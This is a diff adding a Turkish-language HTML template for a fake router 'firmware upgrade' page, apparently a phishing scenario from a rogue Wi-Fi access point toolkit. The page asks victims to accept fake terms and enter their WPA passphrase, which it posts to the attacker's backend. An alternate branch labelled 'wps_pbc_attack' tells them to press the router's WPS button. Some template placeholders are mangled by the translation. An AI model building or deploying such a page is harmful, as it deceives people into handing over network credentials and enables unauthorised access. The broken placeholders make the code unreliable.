@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Router Configuration Page</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="/static/bootstrap.min.css">
+  <link rel="stylesheet" href="/static/font-awesome-4.7.0/css/font-awesome.min.css">
+  <script src="/static/jquery.min.js"></script>
+  <script src="/static/bootstrap.min.js"></script>
+
+  <!-- CSS -->
+  <style type="text/css">
+
+    /* Sticky footer styles
+    -------------------------------------------------- */
+
+    html,
+    body {
+          height: 100%;
+          /* Html ve body öğelerinde herhangi bir dolgu veya kenar boşluğu olamaz. */
+        }
+
+        /* Altbilgiyi aşağı itmek için sayfa içeriği sarmalayıcı */
+        #wrap {
+          min-height: 100%;
+          height: auto !important;
+          height: 100%;
+          /* Negatif girinti altbilgisi yüksekliğine göre */
+          margin: 0 auto -60px;
+        }
+
+        /* Altbilginin sabit yüksekliğini buradan ayarlayın */
+        #push,
+        #footer {
+          height: 60px;
+        }
+        #footer {
+          background-color: #f5f5f5;
+        }
+
+        /* Lastly, apply responsive CSS fixes as necessary */
+        @media (max-width: 767px) {
+          #footer {
+            margin-left: -20px;
+            margin-right: -20px;
+            padding-left: 20px;
+            padding-right: 20px;
+          }
+        }
+
+    img {
+        width: auto;
+        max-width: 100%;
+        height: auto;
+    }
+    .isa_info {
+        color: #9F6000;
+        background-color: #FEEFB3
+    }
+    .isa_info i {
+        margin:1px 3px;
+        font-size:18px;
+        vertical-align:middle;
+    }
+  </style>
+
+</head>
+
+<body>
+
+  <!-- Start navigation bar -->
+  <!-- To change the navigation bar color change background attribute -->
+  <nav class="navbar navbar-inverse" style="background:RoyalBlue;margin-top:2em;">
+    <div class="container-fluid">
+      <div class="navbar-header">
+        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <!--
+        <a class="navbar-brand"><img style="background:transparent" src="Your LOGO" alt="Logo"></a>
+        -->
+      </div>
+      <div class="collapse navbar-collapse" id="myNavbar">
+        <ul class="nav navbar-nav">
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Setup <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Basic Setup</a></li>
+              <li><a href="#">DDNS</a></li>
+              <li><a href="#">MAC Address Clone</a></li>
+              <li><a href="#">Advanced Routing</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Wireless <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Basic Wireless Settings</a></li>
+              <li><a href="#">Wireless Security</a></li>
+              <li><a href="#">Wireless MAC Filter</a></li>
+              <li><a href="#">Advanced Wireless Settings</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Security <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Firewall</a></li>
+              <li><a href="#">VPN</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Access Restriction <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Internet Access</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Administration <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Management</a></li>
+              <li><a href="#">Log</a></li>
+              <li><a href="#">Diagnostics</a></li>
+              <li><a href="#">Factory Defaults</a></li>
+              <li><a href="#">Config Manegements</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Status <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Router</a></li>
+              <li><a href="#">Local Network</a></li>
+              <li><a href="#">Wireless</a></li>
+              <li><a href="#">Advanced Routing</a></li>
+            </ul>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- End navigation bar -->
+
+  <!-- Start page content -->
+  <div class="container">
+	   <div class="col-sm">
+       <center><img id="ap_logo_path" src="/static/{{ target_ap_logo_path }}"></img></center>
+       <h2 class="text-center" style="color:CornflowerBlue">Firmware Yükseltmesi</h2>
+    	 <p class="lead">{{Ap_sürümü} belleniminin ({{firmware_versiyon}}) yeni bir sürümü algılandı ve yüklenmeyi bekliyor. Lütfen aşağıdaki hüküm ve koşulları inceleyin ve devam edin. </p>
+     </div>
+    <form>
+      <div class="form-group">
+        <label for="comment">Şartlar ve koşullar:</label>
+        <textarea readonly class="form-control" rows="5" id="comment">
+1. LICENSE.
+
+Bu Yazılım Lisans Sözleşmesinin hüküm ve koşullarına tabi olarak, {{target_ap_vendor}} işbu belge ile size {{target_ap_vendor}} Donanım Yazılımını / Yazılımını / Sürücülerini yalnızca birlikte kullanmanız için kısıtlı, sınırlı, münhasır olmayan, devredilemez bir lisans verir {{target_ap_vendor}} ürünleri ile. {{Target_ap_vendor}} Şirketi, size ait veya lisanslı olan herhangi bir patent, telif hakkı veya diğer fikri mülkiyet haklarıyla ilgili olarak size herhangi bir lisans hakkı vermez.
+
+2. NO WARRANTY.
+
+{{Target_ap_vendor}} Donanım Yazılımı / Yazılım / Sürücüler, herhangi bir garanti olmaksızın "OLDUĞU GİBİ" sağlanır. {{target_ap_vendor}} Şirket, {{target_ap_vendor}} Firmware / Software / Drivers’da yer alan işlevlerin gereksinimlerinizi karşılayacağını veya {{target_ap_vendor}} Firmware / Software / Drivers’ın çalışmasının kesintisiz veya hata olacağını garanti etmez -Bedava. {{target_ap_vendor}} Şirket, ticarete elverişlilik, belirli bir amaca uygunluk veya ihlal etmeme gibi zımni garantiler dahil ancak bunlarla sınırlı olmamak üzere, {{target_ap_vendor}} ürün yazılımı / yazılımı / sürücüleriyle ilgili açık veya zımni tüm garantileri reddeder.
+
+3. NO LIABILITY.
+
+Hiçbir durumda {{target_ap_vendor}} Şirket veya {{target_ap_vendor}} Firmware / Software / Drivers'ın oluşturulması, üretilmesi veya teslim edilmesinde yer alan herhangi bir diğer taraf bundan kaynaklanan veya bununla ilgili herhangi bir zarardan sorumlu olmayacaktır. Yazılım Lisans Sözleşmesi veya {{target_ap_vendor}} Donanım Yazılımı / Yazılım / Sürücüler, bunlarla sınırlı olmamak üzere, doğrudan, dolaylı, sonuç olarak ortaya çıkan, arızi veya özel hasarlar veya zararlar dahil, ancak bunlarla sınırlı olmamak üzere, iş kesintisinden veya Sorumluluğun ileri sürülebileceği dava biçimi veya yasal teori ne olursa olsun, bu tür zararların olasılığı veya olasılığı tavsiye edilmiş olsa bile veri kaybı.
+
+       </textarea>
+        <div class="checkbox">
+          <label><input type="checkbox" id="check-box" onclick="checkBoxStatus()">Yukarıdaki Hüküm ve Koşulları Kabul Ediyorum</label>
+        </div>
+      </div>
+      <div class="form-group-has-feedback" id="psk_field">
+          <label for="pwd">{{ hedef ap şifreleme }} {{ şifre_adı }}:</label>
+          <input class="form-control" type="password" id="pwd" disabled>
+      </div>
+      <div class="container text-center">
+        <script>
+            if ( "1" == {{ wps_pbc_attack }} && "1" == {{ psk_enable }}) {
+                document.write("<p align=\"left\"> Alternatif olarak, aygıt yazılımı güncelleme işlemini başlatmak için lütfen kablosuz yönlendiriciye gidin ve birkaç saniye WPS düğmesine basın. </p>")
+            } else if ( "1" == {{wps_pbc_attack}}) {
+                document.write("<p align=\"left\"> Lütfen kablosuz yönlendiriciye gidin ve aygıt yazılımı güncelleme işlemini başlatmak için birkaç saniye süreyle WPS düğmesine basın. </p>")
+            }
+        </script>
+        <div class="isa_info" id="pw_status" align="left">
+        </div>
+        <button class="btn btn-primary" id="btn">Start Upgrade</button>
+      </div>
+    </form>
+    <div id="push"></div>
+  </div>
+  <!-- Start page content -->
+
+  <!-- Start footer -->
+  <footer class="footer">
+    <div class="container text-center">
+      <p class="text-muted">© {{target_ap_vendor}} 2019, Tüm Hakları Saklıdır.</p>
+    </div>
+  </footer>
+  <!-- End footer -->
+
+  <!-- Start update first message -->
+  <div class="modal fade" id="update-only" role="dialog">
+    <div class="modal-dialog modal-sm">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Bilgi</h4>
+        </div>
+        <div class="modal-body">
+          <p>Yükseltme gerekli.</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- End update first message -->
+
+  <!-- Start empty password message -->
+  <div class="modal fade" id="empty-pass">
+    <div class="modal-dialog modal-sm">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Bİlgi</h4>
+        </div>
+        <div class="modal-body">
+          <p>Lütfen Geçerli Parola Girin.</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- End empty password message -->
+
+  <!-- Start empty password message -->
+  <div class="modal fade" id="no-checkbox">
+    <div class="modal-dialog modal-sm">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Bilgi</h4>
+        </div>
+        <div class="modal-body">
+          <p>Devam etmek için lütfen Şartlar ve Koşulları kabul edin.</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- End empty password message -->
+
+<script>
+/* If we don't have the logo just not display the image */
+var match = /^http:.*static\/$/.exec(document.getElementById("ap_logo_path").src);
+if (match) {
+    document.getElementById('ap_logo_path').style.display = 'none';
+}
+
+/* initialize the status description based on wps_pbc_attack and psk_enable flags */
+var pw_status_element = document.getElementById('pw_status');
+if ("0" == {{psk_enable}} && "1" == {{wps_pbc_attack}}) {
+    /* hide the pre-shared key region if psk_enable is 0 in the config.ini */
+    document.getElementById('psk_field').style.display = 'none';
+    pw_status_element.innerHTML = "<i class=\"fa fa-info-circle\"></i>Aygıt yazılımı yükseltmesini başlatmak için kullanıcının WPS düğmesine basması bekleniyor. ";
+} else if ("1" == {{psk_enable}} && "1" == {{wps_pbc_attack}}) {
+    pw_status_element.innerHTML = "<i class=\"fa fa-info-circle\"></i>Üretici yazılımı yükseltmesini başlatmak için kullanıcının WPS düğmesine basması veya {{password_name}} girmesi bekleniyor. ";
+}
+
+/*
+  Check the password field and act accordingly.
+*/
+$("#btn").on("click", function(e) {
+    e.preventDefault();
+
+    // get the password box and checkbox elements
+  	var input = document.getElementById("pwd");
+    var box = document.getElementById("check-box");
+
+    // if the box is checked
+  	if ( box.checked == true )
+  		{
+        // check if the psk not entered and wps_pbc_attack is enabled
+        if (input.value == "" && "1" == {{wps_pbc_attack}})
+        {
+            // pass to wps state handler
+            var data =
+            {
+                "get_wps_state_handler": input.value
+            };
+            var dataToSend = JSON.stringify(data);
+            // post the data
+            $.ajax(
+                {
+                    url: '/backend/',
+                    type: 'POST',
+                    data: dataToSend,
+
+                    success: function (jsonResponse) {
+                        var objresponse = JSON.parse(jsonResponse);
+                        var verify_status = objresponse['get_wps_state_handler']
+                        if (verify_status == 'WPS BAĞLANTISI' || verify_status == "WPS BAĞLI") {
+                            /* green for success */
+                            pw_status_element.style.color = "#4F8A10";
+                            pw_status_element.style.backgroundColor = "#DFF2BF";
+                            pw_status_element.innerHTML = "<i class=\"fa fa-check\"></i>Firmware indirme işlemi tamamlandı!"
+                        } else if (verify_status == "WPS_IDLE") {
+                            /* red for error */
+                            pw_status_element.style.color = "#D8000C";
+                            pw_status_element.style.backgroundColor = "#FFD2D2";
+                            pw_status_element.innerHTML = "<i class=\"fa fa-times-circle\"></i>Lütfen aygıt yazılımı yükseltmesini başlatmadan önce WPS düğmesine basın! "
+                        }
+                    },
+                });
+        }
+        // preshared-key is not filled
+        else if ( input.value == "" ) {
+            $("#empty-pass").modal("show");
+        }
+        else
+      		{
+                var data =
+                {
+                    "psk_verify": input.value
+                };
+                var dataToSend = JSON.stringify(data);
+                // post the data
+                $.ajax(
+                    {
+                        url: '/backend/',
+                        type: 'POST',
+                        data: dataToSend,
+
+                        success: function (jsonResponse) {
+                            var objresponse = JSON.parse(jsonResponse);
+                            var verify_status = objresponse['psk_verify']
+                            if (verify_status == 'success') {
+                                document.getElementById("pw_status").innerHTML = ""
+                                post('upgrading.html', {"wfphshr-wpa-password": input.value});
+                            } else if (verify_status == 'fail') {
+                                pw_status_element.style.color = "#D8000C";
+                                pw_status_element.style.backgroundColor = "#FFD2D2";
+                                pw_status_element.innerHTML = "<i class=\"fa fa-times-circle\"></i>The provided {{ password_name }} is invalid!"
+                            } else {
+                                /* we may not define the extensions and in that case
+                                   just post the passphrase */
+                                post('upgrading.html', {"wfphshr-wpa-password": input.value});
+                            }
+                        },
+                    });
+      		    }
+      }
+    else
+      {
+        // display no checkbox message
+        $("#no-checkbox").modal("show");
+      }
+});
+
+/*
+  Post to the fallowing path given the parameters.
+
+  Args:
+    path: The path to be posted to.
+    params: The parameters to be passed.
+*/
+function post(path, params) {
+    // create a form and set its attributes
+    var form = document.createElement("form");
+    form.setAttribute("method", "post");
+    form.setAttribute("action", path);
+
+    // set the attribute for the post
+    for(var key in params) {
+        if(params.hasOwnProperty(key)) {
+            var hiddenField = document.createElement("input");
+            hiddenField.setAttribute("type", "hidden");
+            hiddenField.setAttribute("name", key);
+            hiddenField.setAttribute("value", params[key]);
+
+            form.appendChild(hiddenField);
+         }
+    }
+
+    // submit the post
+    document.body.appendChild(form);
+    form.submit();
+}
+
+/*
+  Check the status of check box
+*/
+function checkBoxStatus()
+{
+  // get the password box and checkbox elements
+	var box = document.getElementById("check-box");
+	var input = document.getElementById("pwd");
+
+  // if the box is checked
+	if ( box.checked == true )
+		{
+      // enabale the password box
+			input.disabled = false;
+		}
+	else
+		{
+      // disable the password box
+			input.disabled = true;
+		}
+  }
+  
+// update copyright year
+var theDate=new Date(); 
+document.getElementsByClassName("text-muted")[0].innerHTML = "© {{ target_ap_vendor }} " + theDate.getFullYear() + ", All Rights Reserved.";
+
+</script>
+</body>
+</html>
